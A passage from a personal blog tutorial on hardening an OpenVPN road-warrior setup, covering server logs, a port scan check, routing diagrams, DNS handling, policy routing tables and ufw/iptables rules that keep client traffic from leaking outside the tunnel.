Data Channel Decrypt: Using <span style="color:#3677a9">160</span> bit message <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;SHA1&#39;</span> <span style="color:#6ab825;font-weight:bold">for</span> HMAC authentication
Control Channel: TLSv1.2, cipher TLSv1/SSLv3 DHE-RSA-AES256-GCM-SHA384, <span style="color:#3677a9">4096</span> bit RSA
[Victor Dorneanu] Peer Connection Initiated with [AF_INET]10.0.1.1:59824
Victor Dorneanu/10.0.1.1:59824 MULTI_sva: pool returned <span style="color:#40ffff">IPv4</span>=10.66.0.6, <span style="color:#40ffff">IPv6</span>=(Not enabled)
Victor Dorneanu/10.0.1.1:59824 MULTI: Learn: 10.66.0.6 -&gt; Victor Dorneanu/10.0.1.1:59824
Victor Dorneanu/10.0.1.1:59824 MULTI: primary virtual IP <span style="color:#6ab825;font-weight:bold">for</span> Victor Dorneanu/10.0.1.1:59824: 10.66.0.6
Victor Dorneanu/10.0.1.1:59824 PUSH: Received control message: <span style="color:#ed9d13">&#39;PUSH_REQUEST&#39;</span>
Victor Dorneanu/10.0.1.1:59824 send_push_reply(): <span style="color:#40ffff">safe_cap</span>=<span style="color:#3677a9">940</span>
Victor Dorneanu/10.0.1.1:59824 SENT CONTROL [Victor Dorneanu]: <span style="color:#ed9d13">&#39;PUSH_REPLY,route 10.66.0.1,topology net30,ping 10,ping-restart 120,ifconfig 10.66.0.6 10.66.0.5&#39;</span> (<span style="color:#40ffff">status</span>=1)
</code></pre></div><p>Perfect!</p>
<ul>
<li>Port scanning</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ sudo nmap -sU 192.168.178.163 -p <span style="color:#3677a9">443</span> 

Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-11 20:24 CET
Nmap scan report <span style="color:#6ab825;font-weight:bold">for</span> debian.local (192.168.178.163)
Host is up (0.00048s latency).
PORT    STATE  SERVICE
443/tcp closed https
MAC Address: 52:54:00:E5:01:E4 (QEMU Virtual NIC)

Nmap <span style="color:#6ab825;font-weight:bold">done</span>: <span style="color:#3677a9">1</span> IP address (<span style="color:#3677a9">1</span> host up) scanned in 0.14 seconds

</code></pre></div><p>So <code>tls-auth</code> seems to work.</p>
<h1 id="routing">Routing</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%nwdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;â†”</span>

    client              [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    internet            [shape = <span style="color:#ed9d13">&#34;cloud&#34;</span>];
    
    client -- internet;
    internet -- gw;
    gw [label = <span style="color:#ed9d13">&#34;Server&#34;</span>];
    <span style="color:#999;font-style:italic">#internet -- gw1;</span>
    <span style="color:#999;font-style:italic">#internet -- gw;</span>
        
    network vpn-net {
        address = <span style="color:#ed9d13">&#34;10.66.0.0/24&#34;</span>
        gw        [address = <span style="color:#ed9d13">&#34;.1&#34;</span>, shape = cisco.vpn_gateway];
        <span style="color:#999;font-style:italic">#victor    [address = &#34;.4&#34;, shape = cisco.pc];</span>
        
    }
    network home-net {
        address = <span style="color:#ed9d13">&#34;192.168.178.0/24&#34;</span>
        
        gw        [address = <span style="color:#ed9d13">&#34;.2&#34;</span>];
        <span style="color:#999;font-style:italic">#router    [address = &#34;.1&#34;, label = &#34;R&#34;, class = obj_router];</span>
        raspberry [address = <span style="color:#ed9d13">&#34;.24&#34;</span>, label = <span style="color:#ed9d13">&#34;Laptop&#34;</span>, <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">obj_workstation</span>];
        storage   [address = <span style="color:#ed9d13">&#34;.25&#34;</span>, label = <span style="color:#ed9d13">&#34;Storage&#34;</span>, <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">obj_storage</span>];    
        
    }
}
</code></pre></div><p><img src="/posts/img/2015/openvpn-for-paranoias/output_7_0.png" alt="png"></p>
<p>We have a typical <strong>road-warrior</strong> use case where a single client connects to a remote subnet using a VPN. Afer sucessfully establishing the VPN connection the client will be part of the <code>vpn-net</code> subnet:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%nwdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
 nwdiag {
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_old</span>       [color = lighgray,style = dotted];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_new</span>       [color = lightblue,style = dotted];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_null</span>      [style = dotted,stacked];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_router</span>    [shape = cisco.router];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_l2sw</span>      [shape = cisco.layer_2_remote_switch];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_fw</span>        [shape = cisco.firewall];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_wlan</span>      [shape = cisco.wireless_router];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_pc</span>        [shape = cisco.pc];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_mobile</span>    [shape = cisco.pda];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_workstation</span> [shape = cisco.workstation];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_storage</span>   [shape = cisco.storage_server];
    <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">obj_web</span>       [shape = cisco.web_cluster];

    client              [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    <span style="color:#999;font-style:italic">#internet            [shape = &#34;cloud&#34;];</span>
    
    <span style="color:#999;font-style:italic">#internet -- gw;</span>
    gw [label = <span style="color:#ed9d13">&#34;Server&#34;</span>];
    <span style="color:#999;font-style:italic">#internet -- gw1;</span>
    <span style="color:#999;font-style:italic">#internet -- gw;</span>
        
    network vpn-net {
        address = <span style="color:#ed9d13">&#34;10.66.0.0/24&#34;</span>
        gw        [address = <span style="color:#ed9d13">&#34;.1&#34;</span>, shape = cisco.vpn_gateway];
        client    [address = <span style="color:#ed9d13">&#34;.4&#34;</span>, shape = cisco.pc];
        
    }
    network home-net {
        address = <span style="color:#ed9d13">&#34;192.168.178.0/24&#34;</span>
        
        gw        [address = <span style="color:#ed9d13">&#34;.2&#34;</span>];
        <span style="color:#999;font-style:italic">#router    [address = &#34;.1&#34;, label = &#34;R&#34;, class = obj_router];</span>
        raspberry [address = <span style="color:#ed9d13">&#34;.24&#34;</span>, label = <span style="color:#ed9d13">&#34;Laptop&#34;</span>, <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">obj_workstation</span>];
        storage   [address = <span style="color:#ed9d13">&#34;.25&#34;</span>, label = <span style="color:#ed9d13">&#34;Storage&#34;</span>, <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#a61717;background-color:#e3d2d2">= </span><span style="color:#447fcf;text-decoration:underline">obj_storage</span>];    
        
    }
}
</code></pre></div><p><img src="/posts/img/2015/openvpn-for-paranoias/output_9_0.png" alt="png"></p>
<p>Having advertised the network address of <code>home-net</code> the client should be able to access <code>Laptop</code> (192.168.178.24) or <code>Storage</code> (192.168.178.25). Also keep in mind that the client will be able to access the whole <code>192.168.178.0/24</code> range. You may want to add client-specific <strong>access policies</strong>.</p>
<h2 id="nating-client-traffic-to-the-internet">NATing client traffic to the Internet</h2>
<p>By passing client&rsquo;s traffic through the OpenVPN server you&rsquo;ll need to implement <strong>NAT</strong>ing in order to let your clients access the Internet or other subnets.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">root@debian:/# iptables -t nat -A POSTROUTING -s 10.66.0.0/24 -o eth0 -j MASQUERADE
</code></pre></div><h1 id="client-based-attack-vectors">Client based attack vectors</h1>
<p>Regardless the countermeasures taken to secure the server, as a client you want your VPN connection to be safe and secure. In a hostile environment like a coffee shop or on any security conferences you want to keep your data safe from any curios eyes. Using a VPN no one could have a look at at the data inside the &ldquo;stream&rdquo; but there are some problems you should be aware of.</p>
<p>An attacker could bring down your VPN connection by spoofing the server and sending you TCP packets with a RST flag inside it. As a consequence this might destroy the virtual interface which in turn will remove all routing rules previously added by the OpenVPN client regarding that specific interface. Afterwards you will be using your physical interface without any further protection. And the worst thing about it: <strong>You won&rsquo;t even notice it!</strong></p>
<p>As found on <a href="https://www.inputoutput.io/hardening-your-vpn-setup-with-iptables/">inputoutput.io</a> and <a href="https://www.agwa.name/blog/post/hardening_openvpn_for_def_con">agwa.name</a> there are several methods how to increase client security either by using firewall rules or routing tables. I&rsquo;ll have a look at both.</p>
<h2 id="dns">DNS</h2>
<p>Even though your VPN provider will &ldquo;push&rdquo; to the clients a trust DNS server, the DHCP server might override this information causing the client to use an untrusted DNS server. In that case the retrieval of DNS information over DHCP should be avoided. Hard-coding an IP address of a trusted DNS server like <code>8.8.8.8</code> is recommended.</p>
<p>The client will get the DNS information from the server, however the <code>/etc/resolv.conf</code> has to be adapted as well. I&rsquo;ve found some <a href="https://github.com/masterkorp/openvpn-update-resolv-conf">hook script</a> which will modify your <code>resolv.conf</code> with the information from the server. On Arch Linux there is an <a href="https://aur.archlinux.org/packages/openvpn-update-resolv-conf/">AUR package</a> as well. After installing the hook script, also change the <strong>client</strong> config file to make this work:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">script-security <span style="color:#3677a9">2</span>
up /etc/openvpn/update-resolv-conf
down /etc/openvpn/update-resolv-conf
</code></pre></div><p>After connecting to the server, you should see sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">...
Mon Nov <span style="color:#3677a9">16</span> 14:05:45 <span style="color:#3677a9">2015</span> /etc/openvpn/update-resolv-conf tun0 <span style="color:#3677a9">1500</span> <span style="color:#3677a9">1570</span> 10.66.0.6 10.66.0.5 init
push <span style="color:#ed9d13">&#34;dhcp-option DNS 208.67.222.222&#34;</span>
push <span style="color:#ed9d13">&#34;dhcp-option DNS 8.8.8.8&#34;</span>
...
</code></pre></div><p><strong>[Update 2015-11-24]</strong>: The <code>update-resolv-conf</code> is now called from <a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-init-sh">another script</a> (see below). The config file should now look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Run scripts after tunnel is up or down</span>
up <span style="color:#ed9d13">&#34;./init.sh -u&#34;</span>
down <span style="color:#ed9d13">&#34;./init.sh -d&#34;</span>
</code></pre></div><h2 id="denial-of-service">Denial of Service</h2>
<p>In the case of our VPN connection DoS attacks would bring down the TCP stream which in turn will cause the virtual interface go down and finally also removing all routing information. In the worst case the client won&rsquo;t have any protection at all (otherwise provided by the VPN tunnel). But first let&rsquo;s have a look at what happens when a client connects to the VPN server:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">1) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip link <span style="color:#24909d">set</span> dev tun0 up mtu <span style="color:#3677a9">1500</span>
2) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip addr add dev tun0 <span style="color:#24909d">local</span> 10.66.0.6 peer 10.66.0.5
3) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip route add xx.xx.xx.xx/32 via 192.168.66.1
4) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip route add 0.0.0.0/1 via 10.66.0.5
5) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip route add 128.0.0.0/1 via 10.66.0.5
6) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip route add 192.168.178.0/24 via 10.66.0.5
7) Fri Nov <span style="color:#3677a9">13</span> 13:17:13 <span style="color:#3677a9">2015</span> /usr/bin/ip route add 10.66.0.1/32 via 10.66.0.5
</code></pre></div><p>Obviously the VPN client did following steps:</p>
<ol>
<li>Set the MTU for the virtual device (tun0)</li>
<li>Set the virtual client (<code>10.66.0.6</code>) and the server endpoints (<code>10.66.0.5</code>)</li>
<li>Add a static routing rule for the VPN server over 192.168.66.1. Prevents the encrypted VPN traffic from being sent via the VPN itself.</li>
<li><code>0.0.0.0/1</code> and <code>128.0.0.0/1</code> cover the entire IPv4 IP address pool. This will basically route all traffic to the Internet through <code>10.66.0.5</code> (tun0)</li>
<li>The <code>home-net</code> subnet (<code>192.168.178.0/24</code>) should also be routable over tun0</li>
<li>Route for the server IP address in the <code>vpn-net</code> subnet</li>
</ol>
<p>Now if a DHCP server pushes a subnet mask for a bigger subnet then this will mask/override the masks from the VPN server. So in some cases the routing information from the DHCP server will be more specific than the OpenVPN routes. For example</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">/usr/bin/ip route add 8.8.8.0/16 via 192.168.66.2
</code></pre></div><p>will be more specific than:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">/usr/bin/ip route add 128.0.0.0/1 via 10.66.0.5
/usr/bin/ip route add 192.168.178.0/24 via 10.66.0.5
</code></pre></div><p>I&rsquo;ve found some ways how to prevent this kind of attacks. On a Linux based system one could use <strong>different routing tables</strong> or harden <strong>firewall rules</strong> to restrict connection outside the VPN tunnel.</p>
<h3 id="use-of-different-routing-tables">Use of different routing tables</h3>
<p>So the main idea described by <a href="https://www.agwa.name/blog/post/hardening_openvpn_for_def_con">Andrew</a> was to use multiple routing tables (I didn&rsquo;t even know one could do that) by putting the OpenVPN routes into a dedicated routing table. So basically we&rsquo;ll add routing information that say:</p>
<ol>
<li>If a packet is destinated to the OpenVPN server, use the <strong>main</strong> table</li>
<li>All other packets should use the <strong>OpenVPN</strong> table</li>
</ol>
<p>This way you&rsquo;ll keep your OpenVPN routes safe from the DHCP ones. Using <code>/usr/bin/ip</code> we will add some rules in the routing policy database and do what is called <strong>policy routing</strong>. The rules are being stored in a <strong>RPDB</strong> (routing policy database). The RPDB controls in which order the kernel search through the routing tables.</p>
<p>According to the man page (<code>ip-rule(8)</code>):</p>
<blockquote>
<p>Each policy routing rule consists of a selector and an action predicate.  The RPDB is scanned in order of
decreasing priority. The selector of each rule is applied to {source address, destination address, incoming
interface, tos, fwmark} and, if the selector matches the packet, the action is performed. The action prediâ€
cate may return with success.  In this case, it will either give a route or failure indication and the RPDB
lookup is terminated. Otherwise, the RPDB program continues with the next rule.</p>
</blockquote>
<p>Also have a look at <a href="http://linux-ip.net/html/routing-rpdb.html">http://linux-ip.net/html/routing-rpdb.html</a> for some useful examples.</p>
<h3 id="add-rules-to-the-rpdb">Add rules to the RPDB</h3>
<p>At startup time the kernel configures the default RPDB consisting of three rules (from the man page):</p>
<ol>
<li>Priority: 0, Selector: match anything, Action: lookup routing table <strong>local</strong> (ID 255).  The local table is a special routing table containing high priority control routes for local and broadcast addresses. Rule 0 is special. It cannot be deleted or overridden.</li>
<li>Priority: 32766, Selector: match anything, Action: lookup routing table <strong>main</strong> (ID 254).  The main table is the normal routing table containing all non-policy routes. This rule may be deleted and/or overridden with other ones by the administrator.</li>
<li>Priority: 32767, Selector: match anything, Action: lookup routing table <strong>default</strong> (ID 253).  The default table is empty. It is reserved for some post-processing if no previous default rules selected the packet.  This rule may also be deleted.</li>
</ol>
<p>Let&rsquo;s have a look at the configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">/usr/bin/ip rule add to &lt;openvpn-server&gt; table main pref <span style="color:#3677a9">1000</span>    (1)
/usr/bin/ip rule add to &lt;openvpn-server&gt; unreachable pref <span style="color:#3677a9">1001</span>   (2)
/usr/bin/ip rule add table <span style="color:#3677a9">94</span> pref <span style="color:#3677a9">1002</span>                          (3)
/usr/bin/ip rule add unreachable pref <span style="color:#3677a9">1003</span>                       (4)
</code></pre></div><p>By using <strong>preferences</strong> numbers we can ensure that the rules are prioritized correctly. Now some explanations</p>
<ol>
<li>The first 2 rules [(1) and (2)] apply to packets whose destination is the IP address of the OpenVPN server.</li>
<li>The 2nd rule prevents VPN server packets being routed through the VPN tunnel itself (in the case the <strong>main</strong> routing table is empty)</li>
<li>The 3rd command defines a new routing table (whose id is <strong>94</strong>)</li>
<li>The last rules prevents packets from using the <strong>main</strong> table in case the OpenVPN table (id = 94) is empty.</li>
</ol>
<p>Let&rsquo;s have a look at the <strong>IP rule policy</strong> after the rules have been added:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( ip rule
0:	from all lookup <span style="color:#24909d">local</span> 
1000:	from all to &lt;server IP addr&gt; lookup main 
1001:	from all to &lt;server IP addr&gt; unreachable
1002:	from all lookup <span style="color:#3677a9">94</span> 
1003:	from all unreachable
32766:	from all lookup main 
32767:	from all lookup default 
</code></pre></div><p>In order of priority the rules say:</p>
<ol>
<li>All traffic destinated to the <server IP addr> should lookup for routing information in table <strong>main</strong></li>
<li>All other traffic should lookup for routing information in table <strong>94</strong>.</li>
</ol>
<p>So let&rsquo;s try that out! Here are routes for table <strong>main</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) ip route show
default via 192.168.66.1 dev wlan0  proto static  metric <span style="color:#3677a9">600</span> 
192.168.66.0/24 dev wlan0  proto kernel  scope link  src 192.168.66.61  metric <span style="color:#3677a9">600</span> 
</code></pre></div><p>Although there is a default route in the main table, packets shouldn&rsquo;t be able to be sent because we have not defined yet any routes for table <strong>94</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( ping h.de
connect: Network is unreachable
</code></pre></div><p>After removing the IP rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">/usr/bin/ip rule del to &lt;openvpn-server&gt;table main pref <span style="color:#3677a9">1000</span>
/usr/bin/ip rule del to &lt;openvpn-server&gt; unreachable pref <span style="color:#3677a9">1001</span>
/usr/bin/ip rule del table <span style="color:#3677a9">94</span> pref <span style="color:#3677a9">1002</span>
/usr/bin/ip rule del unreachable pref <span style="color:#3677a9">1003</span>
</code></pre></div><p>&hellip; everything is back to normal:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) ping h.de -c <span style="color:#3677a9">3</span>
PING h.de (212.34.167.36) 56(84) bytes of data.
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">1</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">53</span> <span style="color:#40ffff">time</span>=27.8 ms
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">2</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">53</span> <span style="color:#40ffff">time</span>=32.1 ms
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">3</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">53</span> <span style="color:#40ffff">time</span>=30.4 ms

--- h.de ping statistics ---
<span style="color:#3677a9">3</span> packets transmitted, <span style="color:#3677a9">3</span> received, 0% packet loss, <span style="color:#24909d">time</span> 2002ms
rtt min/avg/max/mdev = 27.817/30.167/32.187/1.804 ms
</code></pre></div><h3 id="adding-routes-to-the-openvpn-table">Adding routes to the OpenVPN table</h3>
<p>In the next steps OpenVPN should add its routing information to the previously created routing table and <strong>not</strong> the <strong>main</strong> one.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">/sbin/ip route add 0.0.0.0/0.0.0.0 table <span style="color:#3677a9">94</span> dev tun0 via 10.66.0.5
/sbin/ip route add 10.66.0.1/255.255.255.255 table <span style="color:#3677a9">94</span> dev tun0 via 10.66.0.5
</code></pre></div><p>Now you review the routing information in table <strong>94</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( ip route show table <span style="color:#3677a9">94</span>  
default via 10.66.0.5 dev tun0 
10.66.0.1 via 10.66.0.5 dev tun0 
10.66.0.5 dev tun0  proto kernel  scope link  src 10.66.0.6 
</code></pre></div><p><a href="https://www.agwa.name/blog/post/hardening_openvpn_for_def_con">Andrew</a> wrote some hook script you can <a href="https://www.agwa.name/blog/post/hardening_openvpn_for_def_con/media/route">download here</a>. Save this to you machine and make it executable:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># wget https://www.agwa.name/blog/post/hardening\_openvpn\_for\_def\_con/media/route</span>
<span style="color:#999;font-style:italic"># cp route /usr/local/bin/route</span>
<span style="color:#999;font-style:italic"># chmod a+x /usr/local/bin/route</span>
</code></pre></div><p>Now the <strong>client</strong> config file has to be modified:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">setenv OPENVPN<span style="color:#ed9d13">\_</span>ROUTE<span style="color:#ed9d13">\_</span>TABLE <span style="color:#3677a9">94</span>
route-noexec
route-up /usr/local/bin/route
route 0.0.0.0 0.0.0.0
</code></pre></div><p>The <strong>server</strong> config has to be modified as well by removing the <strong>remote-gateway</strong> option:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># push &#34;redirect-gateway def1&#34;</span>
</code></pre></div><h3 id="conclusion">Conclusion</h3>
<p>This solution seems to be very clever, however I&rsquo;ve had <strong>performance</strong> issues and also multiple <strong>routing</strong> problems. Perhaps will somebody see and comment what I&rsquo;m doing wrong.</p>
<h2 id="use-of-firewall-rules">Use of firewall rules</h2>
<h3 id="uncomplicated-firewall-ufw">Uncomplicated Firewall (ufw)</h3>
<p>I&rsquo;ll be using <a href="https://launchpad.net/ufw">ufw</a> for setting up my firewall. First add these lines to <code>/etc/ufw/before.rules</code> before the &ldquo;filer* line:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># NAT (Network Address Translation) table rules</span>
*nat
:POSTROUTING ACCEPT [0:0]

<span style="color:#999;font-style:italic"># Allow traffic from clients to enp1s0</span>
-A POSTROUTING -s 10.66.0.0/24 -o wlan0 -j MASQUERADE

<span style="color:#999;font-style:italic"># Don&#39;t delete these required lines, otherwise there will be errors</span>
*filter
...
</code></pre></div><p>Now enable the firewall:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># ufw enable</span>
Firewall is active and enabled on system startup
<span style="color:#999;font-style:italic"># ufw status</span>
Status: active
</code></pre></div><p>&hellip; add some <strong>ufw</strong> rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#40ffff">SERVER</span>=<span style="color:#ed9d13">`</span>host &lt;vpn-server&gt; | awk <span style="color:#ed9d13">&#39;{ print \\)4; }&#39;</span><span style="color:#ed9d13">`</span>

<span style="color:#999;font-style:italic"># Default policies</span>
ufw default deny incoming
ufw default deny outgoing

<span style="color:#999;font-style:italic"># OpenVPN interface (adjust interface accordingly to your configuration)</span>
ufw allow in on tun0
ufw allow out on tun0

<span style="color:#999;font-style:italic"># Deny any TCP/UDP connections on wlan0</span>
ufw deny out on wlan0
ufw deny in on wlan0

<span style="color:#999;font-style:italic"># Allow local LAN on wlan0 (adjust ip accordingly to your configuration)</span>
ufw allow in on wlan0 from 192.168.0.0/16
ufw allow out on wlan0 to 192.168.0.0/16

<span style="color:#999;font-style:italic"># Over wlan0 allow only traffic to VPN server (:80/udp)</span>
ufw allow in on wlan0 from <span style="color:#ed9d13">\\</span>(SERVER port <span style="color:#3677a9">80</span> proto udp
ufw allow out on wlan0 from <span style="color:#ed9d13">\\</span>)SERVER port <span style="color:#3677a9">80</span> proto udp

<span style="color:#999;font-style:italic"># DNS</span>
ufw allow in from any to any port <span style="color:#3677a9">53</span>
ufw allow out from any to any port <span style="color:#3677a9">53</span>

</code></pre></div><p>Check that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( ufw status verbose
Status: active

To                         Action      From
--                         ------      ----
Anywhere on tun0           ALLOW       Anywhere
Anywhere on wlan0          DENY        Anywhere
Anywhere on wlan0          ALLOW       192.168.0.0/16
Anywhere on wlan0          ALLOW       &lt;vpn-server&gt; 80/udp
<span style="color:#3677a9">53</span>                         ALLOW       Anywhere

Anywhere                   ALLOW OUT   Anywhere on tun0
Anywhere                   DENY OUT    Anywhere on wlan0
192.168.0.0/16             ALLOW OUT   Anywhere on wlan0
Anywhere                   ALLOW OUT   &lt;vpn-server&gt; 80/udp on wlan0
<span style="color:#3677a9">53</span>                         ALLOW OUT   Anywhere
</code></pre></div><p><strong>[Update 2014-11-24]</strong>: The <a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-init-sh">initialization script</a> called by OpenVPN uses <code>iptables</code>. But feel free to adapt if you want to stick with <code>ufw</code>.</p>
<h3 id="using-iptables-prefered">Using iptables (prefered)</h3>
<p><strong>[Update 2015-11-24]</strong>: If you don&rsquo;t want any fancy firewall frameworks, you can of course stick to <code>iptables</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># VPN server address</span>
VPN<span style="color:#ed9d13">\_</span>SERVER=&lt;vpn-server&gt;

<span style="color:#999;font-style:italic"># Local LAN subnet</span>
LOCAL<span style="color:#ed9d13">\_</span>LAN=192.168.0.0/16

<span style="color:#999;font-style:italic"># Interface where your local LAN is accessibble</span>
GW<span style="color:#ed9d13">\_</span>INT=wlan0

<span style="color:#999;font-style:italic"># The VPN virtual interface</span>
VPN<span style="color:#ed9d13">\_</span>INT=tun0

<span style="color:#999;font-style:italic"># Do NATing from VPN interface to gateway interface</span>
iptables -t nat -P POSTROUTING ACCEPT
iptables -t nat -A POSTROUTING -s <span style="color:#ed9d13">\\</span>)VPN_LAN -o <span style="color:#ed9d13">\\</span>(GW<span style="color:#ed9d13">\_</span>INT -j MASQUERADE

<span style="color:#999;font-style:italic"># Allow all traffic on VPN interface</span>
